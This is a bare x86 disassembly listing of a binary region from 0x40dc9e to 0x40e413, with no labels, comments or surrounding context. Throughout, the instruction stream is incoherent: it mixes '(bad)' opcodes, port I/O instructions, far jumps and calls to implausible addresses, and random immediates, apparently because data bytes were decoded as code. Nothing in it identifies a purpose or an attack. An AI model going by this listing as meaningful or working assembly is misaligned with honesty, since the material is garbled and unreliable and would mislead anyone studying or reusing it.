  40dc9e:	xchg   esi,eax
  40dc9f:	push   ss
  40dca0:	outs   dx,BYTE PTR ds:[esi]
  40dca1:	push   ss
  40dca2:	rcl    DWORD PTR [ecx+ebp*4],1
  40dca5:	add    ebp,esp
  40dca7:	mov    esi,0x2004
  40dcac:	add    BYTE PTR [eax],al
  40dcae:	add    dh,bh
  40dcb0:	ror    BYTE PTR [eax],0x8b
  40dcb3:	ss push ds
  40dcb5:	add    DWORD PTR [ecx+0x28d31e38],ecx
  40dcbb:	in     al,dx
  40dcbc:	mov    esi,0xf7003404
  40dcc1:	or     al,0xd4
  40dcc3:	and    ch,BYTE PTR [edx-0x21]
  40dcc6:	lods   al,BYTE PTR ds:[esi]
  40dcc7:	jne    0x40dccb
  40dcc9:	je     0x40dc92
  40dccb:	push   esi
  40dccc:	push   ds
  40dccd:	mov    ecx,0xb6853b88
  40dcd2:	sbb    eax,ebp
  40dcd4:	ja     0x40dcaf
  40dcd6:	cmp    BYTE PTR [eax],0xe
  40dcd9:	push   es
  40dcda:	xor    eax,0x23c4d5ec
  40dcdf:	cld    
  40dce0:	in     eax,dx
  40dce1:	int3   
  40dce2:	daa    
  40dce3:	pop    ebp
  40dce4:	sti    
  40dce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dce6:	add    dh,BYTE PTR [ebp-0x7d]
  40dce9:	and    BYTE PTR fs:[ebp+0x56c07002],cl
  40dcf0:	and    ah,BYTE PTR [edx-0x3f]
  40dcf3:	jb     0x40dc80
  40dcf5:	and    BYTE PTR [eax],cl
  40dcf7:	out    dx,al
  40dcf8:	rcr    eax,0x8c
  40dcfb:	scas   al,BYTE PTR es:[edi]
  40dcfc:	push   ds
  40dcfd:	stc    
  40dcfe:	mov    WORD PTR [esi+0x7ffd001e],?
  40dd04:	jle    0x40dd56
  40dd06:	call   0x2dcddf81
  40dd0b:	push   ebp
  40dd0c:	sbb    dl,BYTE PTR [eax-0x6f]
  40dd0f:	xchg   edx,eax
  40dd10:	loopne 0x40dd11
  40dd12:	call   0x40dd17
  40dd17:	add    BYTE PTR [edx-0x49],ch
  40dd1a:	push   cs
  40dd1b:	gs sahf 
  40dd1d:	add    DWORD PTR [eax],eax
  40dd1f:	jmp    0xfdcdfbec
  40dd24:	jb     0x40dd5c
  40dd26:	pop    eax
  40dd27:	sbb    DWORD PTR ds:0xf3e900a5,0x82664f3f
  40dd31:	ja     0x40dd68
  40dd33:	push   ecx
  40dd34:	retf   0xbd
  40dd37:	jmp    0x22cc0a6b
  40dd3c:	lock add ebp,eax
  40dd3f:	adc    ebx,DWORD PTR [esi]
  40dd41:	js     0x40dd41
  40dd43:	rol    DWORD PTR [eax-0x6af2bc7b],cl
  40dd49:	(bad)  
  40dd4a:	(bad)  
  40dd4b:	mov    ch,0x62
  40dd4d:	cs (bad) 
  40dd4f:	cld    
  40dd50:	mov    dl,0xc
  40dd52:	inc    eax
  40dd53:	jmp    0x834c1f53
  40dd58:	cwde   
  40dd59:	xchg   DWORD PTR [ebx-0x3b],edi
  40dd5c:	stos   BYTE PTR es:[edi],al
  40dd5d:	(bad)  
  40dd5f:	jl     0x40dd6d
  40dd61:	add    eax,DWORD PTR [eax]
  40dd63:	ins    BYTE PTR es:[edi],dx
  40dd64:	xor    eax,0xfb995c22
  40dd69:	cmp    al,0x4f
  40dd6b:	out    dx,al
  40dd6c:	mov    esi,DWORD PTR [ebp+0x35]
  40dd6f:	rol    ebp,1
  40dd71:	rol    BYTE PTR [eax],0xe9
  40dd74:	cmc    
  40dd75:	mov    ch,0x73
  40dd77:	adc    edi,esp
  40dd79:	shl    DWORD PTR [ebx],0x49
  40dd7c:	add    BYTE PTR [eax],al
  40dd7e:	add    BYTE PTR [eax],al
  40dd80:	add    BYTE PTR [ecx+0x75],cl
  40dd83:	adc    al,0x0
  40dd85:	inc    eax
  40dd86:	adc    BYTE PTR [eax+0x0],al
  40dd89:	xchg   ecx,ecx
  40dd8b:	add    DWORD PTR [ebx],ecx
  40dd8d:	xor    al,0xa9
  40dd8f:	retf   
  40dd90:	call   ebx
  40dd92:	cmc    
  40dd93:	mov    esi,0xfec4880f
  40dd98:	(bad)  
  40dd99:	fmul   QWORD PTR [edx+0x4e7c2442]
  40dd9f:	mov    edi,eax
  40dda1:	pushf  
  40dda2:	stc    
  40dda3:	xor    edi,edi
  40dda5:	sbb    ch,dl
  40dda7:	test   DWORD PTR [ebp-0x23],eax
  40ddaa:	add    edi,edi
  40ddac:	ss push edi
  40ddae:	les    eax,FWORD PTR [edi-0x3450bfd]
  40ddb4:	call   DWORD PTR [ebx-0x1c]
  40ddb7:	dec    ecx
  40ddb8:	push   0x54
  40ddba:	mov    edi,DWORD PTR [edx+0x24]
  40ddbd:	in     al,dx
  40ddbe:	pop    ecx
  40ddbf:	out    0x1a,al
  40ddc1:	and    bh,dh
  40ddc3:	dec    DWORD PTR [eax+ecx*8+0x21506015]
  40ddca:	mov    ch,0x22
  40ddcc:	cmp    al,0xec
  40ddce:	test   ch,al
  40ddd0:	push   eax
  40ddd1:	mov    dh,0x1d
  40ddd3:	pop    edi
  40ddd4:	lea    ebx,[eax]
  40ddd6:	adc    eax,0x15c0080
  40dddb:	call   0xfe395ba4
  40dde0:	sbb    DWORD PTR [eax+0xc084fd],0x0
  40dde7:	add    BYTE PTR [eax],al
  40dde9:	add    al,bl
  40ddeb:	jnp    0x40dd76
  40dded:	jl     0x40de27
  40ddef:	adc    DWORD PTR [ebx-0x76262832],ecx
  40ddf5:	inc    esp
  40ddf6:	cmp    BYTE PTR ds:0xc7ece851,al
  40ddfc:	std    
  40ddfd:	call   FWORD PTR [ecx+0x756872be]
  40de03:	loopne 0x40ddf4
  40de05:	and    ecx,DWORD PTR [ecx+0x768a58e0]
  40de0b:	lock mul DWORD PTR [ebx]
  40de0e:	popa   
  40de0f:	out    0xc7,al
  40de11:	aaa    
  40de12:	jno    0x40de57
  40de14:	sub    ch,cl
  40de16:	add    ah,BYTE PTR [edi+edi*2-0x72d37e41]
  40de1d:	add    dh,BYTE PTR [esi+0x5d]
  40de20:	in     al,dx
  40de21:	add    ebx,DWORD PTR [ebp-0x79]
  40de24:	hlt    
  40de25:	aas    
  40de26:	jne    0x40de63
  40de28:	ins    BYTE PTR es:[edi],dx
  40de29:	pop    ss
  40de2a:	stos   DWORD PTR es:[edi],eax
  40de2b:	jnp    0x40dea5
  40de2d:	mov    al,BYTE PTR [ebx+0x760404e8]
  40de33:	pusha  
  40de34:	iret   
  40de35:	dec    BYTE PTR [ecx+0x3f]
  40de38:	es push ecx
  40de3a:	int    0x64
  40de3c:	dec    eax
  40de3d:	(bad)  
  40de3e:	mov    dl,0x69
  40de40:	cmp    ecx,DWORD PTR [ebx+0x76776328]
  40de46:	dec    ebp
  40de47:	ret    
  40de48:	mov    dh,0xcc
  40de4a:	call   0x0:0x58cbb
  40de51:	add    BYTE PTR [eax],al
  40de53:	xchg   edx,eax
  40de54:	scas   al,BYTE PTR es:[edi]
  40de55:	push   ds
  40de56:	sub    ah,bh
  40de58:	mov    ds:0xe2768b2a,eax
  40de5d:	shr    BYTE PTR [ebx],0x8d
  40de60:	rol    BYTE PTR [esi-0x2],1
  40de63:	jb     0x40ddf5
  40de65:	push   cs
  40de66:	push   esi
  40de67:	pop    ebp
  40de68:	cmc    
  40de69:	dec    ecx
  40de6a:	(bad)  
  40de6b:	(bad)  
  40de6c:	fiadd  DWORD PTR [edx]
  40de6e:	jmp    0x40dee7
  40de70:	mov    bh,0x42
  40de72:	pop    esi
  40de73:	mov    bl,0xa0
  40de75:	mov    esp,esp
  40de77:	test   al,0x27
  40de79:	add    BYTE PTR [eax],al
  40de7b:	test   al,0xe0
  40de7d:	or     BYTE PTR [bx+di+0x3],0x4d
  40de82:	aad    0xc8
  40de84:	xchg   DWORD PTR [ebx+0x8],edx
  40de87:	cmc    
  40de88:	hlt    
  40de89:	in     al,0x3
  40de8b:	retf   0x6403
  40de8e:	je     0x40deaa
  40de90:	je     0x40de7a
  40de92:	mov    WORD PTR [eax+0xede6a0a],cs
  40de98:	add    esp,DWORD PTR [esi+edi*4-0x2]
  40de9c:	rol    BYTE PTR [edx+0x12],cl
  40de9f:	mov    ds:0x743cac6a,eax
  40dea4:	add    dh,BYTE PTR [edx+0x5b]
  40dea7:	std    
  40dea8:	aad    0x90
  40deaa:	jle    0x40de6b
  40deac:	in     eax,dx
  40dead:	in     eax,0x35
  40deaf:	mov    ch,0x69
  40deb1:	pop    edx
  40deb2:	add    dh,BYTE PTR [ebp+0x2]
  40deb5:	adc    ebp,DWORD PTR [esi]
  40deb7:	add    BYTE PTR [eax],al
  40deb9:	add    BYTE PTR [eax],al
  40debb:	add    al,bh
  40debd:	cmc    
  40debe:	pushf  
  40debf:	fcmovnu st,st(2)
  40dec1:	sub    BYTE PTR [edx+eax*1],bh
  40dec4:	jne    0x40deae
  40dec6:	adc    BYTE PTR [edi+0x6bc04231],al
  40decc:	mov    esp,DWORD PTR [ebp-0x420ffc19]
  40ded2:	xor    al,0xd3
  40ded4:	fwait
  40ded5:	in     eax,dx
  40ded6:	inc    esp
  40ded7:	aam    0x9a
  40ded9:	cmp    eax,0x877502a9
  40dede:	and    eax,0x40cf32d2
  40dee3:	mov    esp,0xd4e90137
  40dee8:	add    ebp,eax
  40deea:	sbb    al,0x8a
  40deec:	mov    cl,0x76
  40deee:	add    BYTE PTR [edx-0x7cf28c9f],dl
  40def4:	lahf   
  40def5:	add    bh,BYTE PTR [ebx+ecx*1-0x5a]
  40def9:	push   0xffffffd6
  40defb:	inc    esi
  40defc:	dec    ebx
  40defd:	jae    0x40defe
  40deff:	add    DWORD PTR [ecx],ecx
  40df01:	jmp    0x5f843b3d
  40df06:	push   edi
  40df07:	rcl    DWORD PTR [ebp+0x1ce900a7],1
  40df0d:	sub    cl,BYTE PTR [ebp-0x183456ac]
  40df13:	mov    al,0xcd
  40df15:	add    DWORD PTR [eax],eax
  40df17:	jb     0x40df6b
  40df19:	ret    
  40df1a:	mov    WORD PTR [ecx+esi*4],fs
  40df1d:	ret    
  40df1e:	mov    WORD PTR [eax+eax*1],gs
  40df21:	add    BYTE PTR [eax],al
  40df23:	add    BYTE PTR [eax],al
  40df25:	xchg   ebp,eax
  40df26:	ret    
  40df27:	imul   ecx,DWORD PTR [edx],0x85748622
  40df2d:	popa   
  40df2e:	mov    bl,bh
  40df30:	sahf   
  40df31:	bound  eax,QWORD PTR [eax-0x4d0a1a3d]
  40df37:	jae    0x40dedd
  40df39:	out    dx,al
  40df3a:	inc    esp
  40df3b:	mov    ah,BYTE PTR [ecx+0x7d7c85a8]
  40df41:	cld    
  40df42:	mov    ebp,0x45a281f7
  40df47:	(bad)  
  40df48:	outs   dx,BYTE PTR ds:[esi]
  40df49:	hlt    
  40df4a:	mov    dl,0x73
  40df4c:	and    ah,BYTE PTR [ecx+0x76a9725e]
  40df52:	call   0xbe2e915a
  40df57:	test   DWORD PTR [ecx-0x3a],0xf446fe45
  40df5e:	mov    dl,0x73
  40df60:	push   es
  40df61:	(bad)  
  40df62:	mov    ebp,0x6aac6207
  40df67:	mov    dl,BYTE PTR [edx+eax*1-0x728e24d0]
  40df6e:	adc    ecx,DWORD PTR [ecx+0x4f7b66b1]
  40df74:	popf   
  40df75:	icebp  
  40df76:	fnstenv [edi-0x79]
  40df79:	jmp    0xc7415b57
  40df7e:	inc    ebx
  40df7f:	or     al,dh
  40df81:	sbb    al,0xa
  40df83:	add    ecx,ebp
  40df85:	xchg   esp,eax
  40df86:	push   es
  40df87:	add    BYTE PTR [eax],al
  40df89:	add    BYTE PTR [eax],al
  40df8b:	add    BYTE PTR [eax],al
  40df8d:	add    bh,dl
  40df8f:	dec    ebx
  40df90:	imul   cl
  40df92:	retf   0xfdf9
  40df95:	inc    esp
  40df97:	dec    BYTE PTR [edi]
  40df99:	add    BYTE PTR [esi+ebx*8],cl
  40df9c:	pop    esi
  40df9d:	int3   
  40df9e:	sub    edi,ecx
  40dfa0:	mov    eax,ebx
  40dfa2:	mov    eax,ds:0x21840dcc
  40dfa7:	stc    
  40dfa8:	std    
  40dfa9:	call   FWORD PTR [ecx-0x4baef5c6]
  40dfaf:	push   es
  40dfb0:	adc    BYTE PTR [eax],al
  40dfb2:	fdivr  QWORD PTR [edx+0x41]
  40dfb5:	push   es
  40dfb6:	lods   al,BYTE PTR ds:[esi]
  40dfb7:	stc    
  40dfb8:	je     0x40dfc2
  40dfba:	or     edx,DWORD PTR [ebx]
  40dfbc:	mov    al,0x15
  40dfbe:	mov    WORD PTR [esi],es
  40dfc0:	cmp    eax,0xffffffdd
  40dfc3:	or     BYTE PTR [ebp-0x207b4c5],al
  40dfc9:	or     ecx,0x9
  40dfcc:	add    BYTE PTR [ebp-0x55],dh
  40dfcf:	pop    ebx
  40dfd0:	add    ebx,DWORD PTR [eax-0x14]
  40dfd3:	pop    ebp
  40dfd4:	jmp    0xcae8:0x5305dc73
  40dfdb:	leave  
  40dfdc:	std    
  40dfdd:	call   DWORD PTR ds:0xede80a42
  40dfe3:	repz std 
  40dfe5:	inc    DWORD PTR [edi]
  40dfe7:	inc    edx
  40dfe8:	push   es
  40dfe9:	dec    esp
  40dfeb:	jno    0x40dfd6
  40dfed:	push   ebp
  40dfee:	dec    ebx
  40dfef:	jb     0x40dffb
  40dff1:	mov    eax,DWORD PTR [eax]
  40dff3:	add    BYTE PTR [eax],al
  40dff5:	add    BYTE PTR [eax],al
  40dff7:	(bad)  
  40dff8:	pop    ebp
  40dff9:	bnd jae 0x40e018
  40dffc:	add    eax,0xb875056a
  40e001:	push   0xffffffc0
  40e003:	cmp    al,BYTE PTR [eax]
  40e005:	jbe    0x40e05f
  40e007:	lods   al,BYTE PTR ds:[esi]
  40e008:	fdivr  QWORD PTR [edx-0x2]
  40e00b:	jp     0x40dff4
  40e00d:	jnp    0x40e00c
  40e00f:	inc    edx
  40e010:	js     0x40dfed
  40e012:	(bad)  
  40e013:	jno    0x40e068
  40e015:	pop    es
  40e016:	or     dh,dh
  40e018:	call   0xfee:0x692d8301
  40e01f:	and    cl,dh
  40e021:	pop    es
  40e022:	lea    ebp,[esi-0x7e732e97]
  40e028:	arpl   cx,dx
  40e02a:	out    0x46,eax
  40e02c:	lahf   
  40e02d:	je     0x40e02d
  40e02f:	je     0x40e04f
  40e031:	or     BYTE PTR [ebx+0x33c4fb0],cl
  40e037:	lea    esi,[esi+0x73]
  40e03a:	inc    esp
  40e03b:	jns    0x40e031
  40e03d:	mov    esi,0x1a5ebb0b
  40e042:	or     bl,dl
  40e044:	and    eax,0x73388b08
  40e049:	xchg   DWORD PTR [ecx+edi*2-0x24],ecx
  40e04d:	jecxz  0x40e0c6
  40e04f:	jne    0x40e033
  40e051:	fld    TBYTE PTR [edi-0x14]
  40e054:	and    dh,al
  40e056:	gs mov edx,0xfff69a
  40e05c:	add    BYTE PTR [eax],al
  40e05e:	add    BYTE PTR [eax],al
  40e060:	stos   BYTE PTR es:[edi],al
  40e061:	mov    al,BYTE PTR [edx]
  40e063:	pop    edi
  40e064:	inc    ebx
  40e065:	mov    ah,0x49
  40e067:	shr    DWORD PTR [ebp+0x5b],0x87
  40e06b:	aas    
  40e06c:	jns    0x40dffe
  40e06e:	jae    0x40e0e3
  40e070:	push   ecx
  40e071:	jae    0x40dff8
  40e073:	ja     0x40e0d2
  40e075:	fadd   QWORD PTR [ebx+0x13]
  40e078:	lea    esp,[esi+0x372fe46]
  40e07e:	push   ds
  40e07f:	pop    esp
  40e080:	pop    DWORD PTR [edx+0x15]
  40e083:	pop    esp
  40e084:	ret    
  40e085:	inc    esp
  40e086:	in     al,dx
  40e087:	add    eax,eax
  40e089:	jnp    0x40e087
  40e08b:	sbb    BYTE PTR [esi+0x37],0x9a
  40e08f:	int    0xff
  40e091:	jno    0x40e104
  40e093:	mov    esi,0xffa07b6a
  40e098:	mov    ds:0xfd7b9379,eax
  40e09d:	(bad)
  40e0a0:	cmp    eax,0x22836500
  40e0a5:	jo     0x40e08f
  40e0a7:	sbb    BYTE PTR [ebp+0x52eee916],0xdc
  40e0ae:	std    
  40e0af:	xchg   BYTE PTR [ecx-0x4c93df9a],cl
  40e0b5:	fwait
  40e0b6:	out    0x3,eax
  40e0b8:	push   0xffffffb7
  40e0ba:	adc    al,BYTE PTR es:[ebp-0x1]
  40e0be:	pop    ebp
  40e0bf:	mov    ebp,0x3c71d27a
  40e0c4:	add    BYTE PTR [eax],al
  40e0c6:	add    BYTE PTR [eax],al
  40e0c8:	add    BYTE PTR [edx],dh
  40e0ca:	fdivr  st(0),st
  40e0cc:	aam    0xe9
  40e0ce:	cmc    
  40e0cf:	pushf  
  40e0d0:	imul   edx,ecx,0x50
  40e0d3:	test   DWORD PTR [edi+esi*8+0x46],esi
  40e0d7:	in     al,dx
  40e0d8:	jle    0x40e0dc
  40e0da:	not    edi
  40e0dc:	mov    BYTE PTR [eax+0x3988907b],ch
  40e0e2:	outs   dx,BYTE PTR ds:[esi]
  40e0e3:	mov    bh,0x6b
  40e0e5:	rep outs dx,DWORD PTR ds:[esi]
  40e0e7:	pop    ebp
  40e0e8:	je     0x40e0e0
  40e0ea:	inc    edx
  40e0eb:	(bad)  [eax]
  40e0ed:	idiv   BYTE PTR [edx]
  40e0ef:	dec    ebp
  40e0f0:	push   0xd8eadc4e
  40e0f5:	inc    edx
  40e0f6:	leave  
  40e0f7:	fsub   st(6),st
  40e0f9:	pop    ebp
  40e0fa:	jnp    0x40e0fb
  40e0fc:	daa    
  40e0fd:	repz not DWORD PTR [edi]
  40e100:	shr    esi,0xf4
  40e103:	aas    
  40e104:	jmp    0x11548ffe
  40e109:	sbb    eax,0xdb16fe3c
  40e10e:	scas   eax,DWORD PTR es:[edi]
  40e10f:	jmp    0x3672:0xfbc5fd32
  40e116:	add    edi,edi
  40e118:	je     0x40e0d8
  40e11a:	jl     0x40e178
  40e11c:	loope  0x40e196
  40e11e:	das    
  40e11f:	sbb    al,0xe8
  40e121:	std    
  40e122:	(bad)  
  40e125:	jmp    0xee1fdf99
  40e12a:	scas   al,BYTE PTR es:[edi]
  40e12b:	jae    0x40e0d5
  40e12d:	add    BYTE PTR [eax],al
  40e12f:	add    BYTE PTR [eax],al
  40e131:	add    BYTE PTR [edx+0x42],ah
  40e134:	pop    esi
  40e135:	das    
  40e136:	inc    edx
  40e137:	cmp    al,cl
  40e139:	in     eax,dx
  40e13a:	jbe    0x40e10f
  40e13c:	push   esp
  40e13d:	pop    ss
  40e13e:	xor    dl,0x17
  40e141:	bound  ebp,QWORD PTR [edi]
  40e143:	add    ecx,DWORD PTR [ebx+0x73aefcc3]
  40e149:	jecxz  0x40e141
  40e14b:	neg    BYTE PTR [ebx]
  40e14d:	call   0x1c9be212
  40e152:	push   0xffffffd7
  40e154:	mov    WORD PTR [ecx],ss
  40e156:	sbb    edx,0x6eb6fafb
  40e15c:	sub    DWORD PTR [ecx-0x5d97a5a3],0x645e7046
  40e166:	cmp    esi,esi
  40e168:	add    al,0x6a
  40e16a:	imul   esi,DWORD PTR [eax-0x16],0x3c52201
  40e171:	popa   
  40e172:	test   eax,0x5aad8b0a
  40e177:	adc    dl,BYTE PTR [ebp+0x0]
  40e17a:	pop    es
  40e17b:	mov    esp,0xf342f6e6
  40e180:	std    
  40e181:	test   BYTE PTR [edx+ebp*2-0x1d],cl
  40e185:	xor    ebx,DWORD PTR [eax+edx*2-0x561a4a5]
  40e18c:	dec    DWORD PTR [edx+0x7882fa0d]
  40e192:	dec    eax
  40e193:	add    dh,BYTE PTR [eax+eiz*1+0x0]
  40e197:	add    BYTE PTR [eax],al
  40e199:	add    BYTE PTR [eax],al
  40e19b:	xlat   BYTE PTR ds:[ebx]
  40e19c:	inc    esi
  40e19d:	add    dl,BYTE PTR [ebx-0x39]
  40e1a0:	push   edx
  40e1a1:	and    cl,BYTE PTR [eax]
  40e1a3:	jmp    0x40e127
  40e1a5:	jbe    0x40e1cb
  40e1a7:	fiadd  WORD PTR [esi+edi*4-0x34da8be0]
  40e1ae:	call   DWORD PTR [ebx]
  40e1b0:	push   ecx
  40e1b1:	pop    ecx
  40e1b2:	test   esp,ecx
  40e1b4:	push   0x3
  40e1b6:	adc    esp,0xfffffff0
  40e1b9:	jmp    0xc10750c0
  40e1be:	add    al,0x1c
  40e1c0:	add    DWORD PTR [edi+0x3fed2851],esi
  40e1c6:	sbb    BYTE PTR [edx-0x50],bl
  40e1c9:	mov    BYTE PTR [eax],0xdc
  40e1cc:	add    DWORD PTR [esi+0x3b],esp
  40e1cf:	sub    dl,BYTE PTR [ecx+esi*2+0x5]
  40e1d3:	dec    edi
  40e1d4:	fbld   TBYTE PTR [edx+0x73]
  40e1d7:	leave  
  40e1d8:	in     al,dx
  40e1d9:	push   cs
  40e1da:	call   FWORD PTR [esi+0x6d8b65fa]
  40e1e0:	or     ch,BYTE PTR [edx+0x1]
  40e1e3:	jp     0x40e1d4
  40e1e5:	dec    esi
  40e1e6:	or     ah,dh
  40e1e8:	adc    cl,BYTE PTR [eax]
  40e1ea:	add    bl,BYTE PTR [esp+esi*1-0x13163c40]
  40e1f1:	jmp    0x753d:0x80153083
  40e1f8:	into   
  40e1f9:	cmp    al,0x42
  40e1fb:	jne    0x40e258
  40e1fd:	aad    0x55
  40e1ff:	add    BYTE PTR [eax],al
  40e201:	add    BYTE PTR [eax],al
  40e203:	add    BYTE PTR [edx],ah
  40e205:	je     0x40e18d
  40e207:	xor    BYTE PTR [esi+0x5b],0x2
  40e20b:	call   0x435b8a
  40e210:	stc    
  40e211:	sbb    al,BYTE PTR [edx]
  40e213:	test   bl,ah
  40e215:	pop    eax
  40e216:	add    al,BYTE PTR [eax]
  40e218:	test   BYTE PTR [ebp-0x20940002],0xde
  40e21f:	add    dh,BYTE PTR [ebp+0x5b]
  40e222:	test   DWORD PTR [ebp+eiz*2+0x5b],edi
  40e226:	add    DWORD PTR [esi+0x258d7],ecx
  40e22c:	out    dx,al
  40e22d:	in     eax,dx
  40e22e:	cli    
  40e22f:	push   ebp
  40e230:	sbb    eax,0x2afe6b9a
  40e235:	fild   WORD PTR [ebx+0xe]
  40e238:	stc    
  40e239:	sub    DWORD PTR ds:0x2ee07500,eax
  40e23f:	adc    al,0x66
  40e241:	sbb    eax,DWORD PTR [ebx+edi*4]
  40e244:	ins    DWORD PTR es:[edi],dx
  40e245:	mov    al,0xc4
  40e247:	jmp    DWORD PTR [edi-0x4018a754]
  40e24d:	inc    esp
  40e24e:	jo     0x40e24e
  40e250:	cld    
  40e251:	and    eax,0xa3ed8270
  40e256:	add    BYTE PTR [esi+ecx*4+0x4c000258],al
  40e25d:	fwait
  40e25e:	jnp    0x40e25f
  40e260:	rcr    BYTE PTR [edx+0x3],cl
  40e263:	add    eax,0xffc4b081
  40e268:	add    BYTE PTR [eax],al
  40e26a:	add    BYTE PTR [eax],al
  40e26c:	add    bh,dh
  40e26e:	add    bh,al
  40e270:	inc    DWORD PTR [ecx+0x5d]
  40e273:	xor    BYTE PTR [edi+0x30],0x5b
  40e277:	test   BYTE PTR [edi],0xaa
  40e27a:	add    esp,ebx
  40e27c:	adc    esp,DWORD PTR [edx-0x1ea4130a]
  40e282:	push   0x55
  40e284:	jno    0x40e223
  40e286:	or     eax,0x797503ea
  40e28b:	and    BYTE PTR [ebp-0x51],bh
  40e28e:	jp     0x40e22b
  40e290:	pop    edi
  40e291:	xchg   edx,eax
  40e292:	mov    al,BYTE PTR [ebp+0x71]
  40e295:	jae    0x40e311
  40e297:	mov    ds:0x8e42a773,eax
  40e29c:	jp     0x40e257
  40e29e:	jbe    0x40e30b
  40e2a0:	(bad)  
  40e2a1:	dec    esi
  40e2a2:	jp     0x40e24d
  40e2a4:	sar    edi,cl
  40e2a6:	lds    ebx,FWORD PTR [eax]
  40e2a8:	xor    eax,0xf82f2843
  40e2ad:	pop    edi
  40e2ae:	je     0x40e298
  40e2b0:	add    al,cl
  40e2b2:	adc    al,0x99
  40e2b4:	jo     0x40e25f
  40e2b6:	pop    esi
  40e2b7:	add    BYTE PTR [esi+0x2f],ch
  40e2ba:	ins    BYTE PTR es:[edi],dx
  40e2bb:	in     eax,0x87
  40e2bd:	loop   0x40e2ba
  40e2bf:	fs popf 
  40e2c1:	je     0x40e2c5
  40e2c3:	jmp    0xc19f9c44
  40e2c8:	mov    dl,0xff
  40e2ca:	(bad)
  40e2cd:	jmp    0x0:0x3e886
  40e2d4:	add    BYTE PTR [eax],al
  40e2d6:	jne    0x40e2ff
  40e2d8:	xchg   edi,eax
  40e2d9:	stc    
  40e2da:	dec    edx
  40e2db:	sub    DWORD PTR [esp+edx*1],ecx
  40e2de:	jp     0x40e2a0
  40e2e0:	inc    ebx
  40e2e1:	adc    al,0x46
  40e2e3:	imul   ebx,DWORD PTR [eax-0x7d],0xffffffda
  40e2e7:	imul   ebp,eax,0x70
  40e2ea:	dec    ecx
  40e2eb:	inc    BYTE PTR [eax-0x7a944276]
  40e2f1:	jl     0x40e32c
  40e2f3:	pop    esi
  40e2f4:	iret   
  40e2f5:	mov    esi,esi
  40e2f7:	add    al,BYTE PTR [eax]
  40e2f9:	jmp    0x7d855a74
  40e2fe:	sub    DWORD PTR [ebx+0x276e983],eax
  40e304:	cmp    ebp,DWORD PTR [edi]
  40e306:	mov    ds:0xf699ff15,eax
  40e30b:	imul   edi,esi,0xffffffe9
  40e30e:	cs daa 
  40e310:	leave  
  40e311:	inc    esi
  40e312:	add    eax,0xff4d4478
  40e317:	call   0xd8eb:0x276e97f
  40e31e:	jmp    0x772a630e
  40e323:	add    dl,BYTE PTR [ecx+0x6c]
  40e326:	pop    edx
  40e327:	adc    edx,DWORD PTR [ecx-0x47]
  40e32a:	scas   al,BYTE PTR es:[edi]
  40e32b:	(bad)  
  40e32c:	enter  0xc50e,0x78
  40e330:	inc    esp
  40e331:	adc    eax,0xe1bdf5a1
  40e336:	jns    0x40e2f8
  40e338:	call   FWORD PTR [esi+0x0]
  40e33e:	add    BYTE PTR [ebp+0x36da1816],ah
  40e344:	imul   edi,ebp,0x5c
  40e347:	mov    DWORD PTR [ebx+0x74],ebp
  40e34a:	in     eax,dx
  40e34b:	mov    esi,esi
  40e34d:	pop    es
  40e34e:	(bad)  
  40e34f:	ins    BYTE PTR es:[edi],dx
  40e350:	ret    0x2aca
  40e353:	jno    0x40e3cc
  40e355:	xlat   BYTE PTR ds:[ebx]
  40e356:	push   0xffffffad
  40e358:	test   DWORD PTR [edx+eiz*4-0x14b07d06],0xae560276
  40e363:	inc    edx
  40e364:	js     0x40e3da
  40e366:	icebp  
  40e367:	ds pushf 
  40e369:	in     al,dx
  40e36a:	sahf   
  40e36b:	dec    edx
  40e36c:	js     0x40e365
  40e36e:	pusha  
  40e36f:	les    esp,FWORD PTR [esi-0x7e]
  40e372:	mov    ds,WORD PTR [edx-0x4]
  40e375:	add    DWORD PTR [eax],0xfffffffb
  40e378:	add    al,0x0
  40e37a:	add    BYTE PTR [edi+0x71],cl
  40e37d:	out    dx,al
  40e37e:	add    BYTE PTR [edi],dl
  40e380:	sub    DWORD PTR [ebx+ecx*8],esi
  40e383:	pop    edi
  40e384:	push   es
  40e385:	je     0x40e3a1
  40e387:	daa    
  40e388:	sub    ebp,DWORD PTR [eax-0x37]
  40e38b:	and    al,0x6
  40e38d:	add    BYTE PTR [eax],al
  40e38f:	lahf   
  40e390:	sub    al,0xe7
  40e392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e393:	dec    edx
  40e394:	(bad)  
  40e396:	mov    ecx,edx
  40e398:	out    dx,al
  40e399:	add    eax,0xffffff8b
  40e39c:	adc    bh,0x1
  40e39f:	pop    esp
  40e3a0:	push   es
  40e3a1:	mov    eax,edi
  40e3a3:	add    BYTE PTR [eax],al
  40e3a5:	add    BYTE PTR [eax],al
  40e3a7:	add    BYTE PTR ds:0x4c0086c6,dh
  40e3ad:	push   es
  40e3ae:	add    eax,esi
  40e3b0:	in     eax,0x3b
  40e3b2:	jmp    0x2875:0xfd557233
  40e3b9:	test   DWORD PTR [esi+0x6b61e438],edi
  40e3bf:	inc    eax
  40e3c0:	dec    esp
  40e3c1:	into   
  40e3c2:	mov    ch,0xf2
  40e3c4:	sbb    eax,0x95f88b06
  40e3c9:	jae    0x40e3c1
  40e3cb:	push   bp
  40e3cd:	imul   esi,edx,0x76
  40e3d0:	stos   BYTE PTR es:[edi],al
  40e3d1:	in     eax,dx
  40e3d2:	dec    ebx
  40e3d3:	in     al,dx
  40e3d4:	push   edx
  40e3d5:	test   DWORD PTR [edi+0x4a73438],edi
  40e3db:	add    cl,BYTE PTR [ecx*1-0x12a78b21]
  40e3e2:	inc    ebx
  40e3e3:	in     al,dx
  40e3e4:	push   edi
  40e3e5:	in     eax,dx
  40e3e6:	add    BYTE PTR [eax],0xdc
  40e3e9:	add    eax,0xb569cb03
  40e3ee:	jle    0x40e3f0
  40e3f0:	int3   
  40e3f1:	add    eax,0x9875a1e8
  40e3f6:	ins    DWORD PTR es:[edi],dx
  40e3f7:	(bad)  
  40e3f8:	icebp  
  40e3f9:	fwait
  40e3fa:	std    
  40e3fb:	xor    ebp,0x5a
  40e3fe:	add    al,BYTE PTR [eax]
  40e400:	out    dx,al
  40e401:	push   ds
  40e402:	pusha  
  40e403:	mov    bh,ch
  40e405:	xlat   BYTE PTR ds:[ebx]
  40e406:	add    al,BYTE PTR [eax]
  40e408:	jne    0x40e3e8
  40e40a:	cmp    esi,DWORD PTR [ebx+0x0]
  40e40d:	add    BYTE PTR [eax],al
  40e40f:	add    BYTE PTR [eax],al
  40e411:	mov    esp,esi
  40e413:	cmp    BYTE PTR [edi+0x75],0x5b
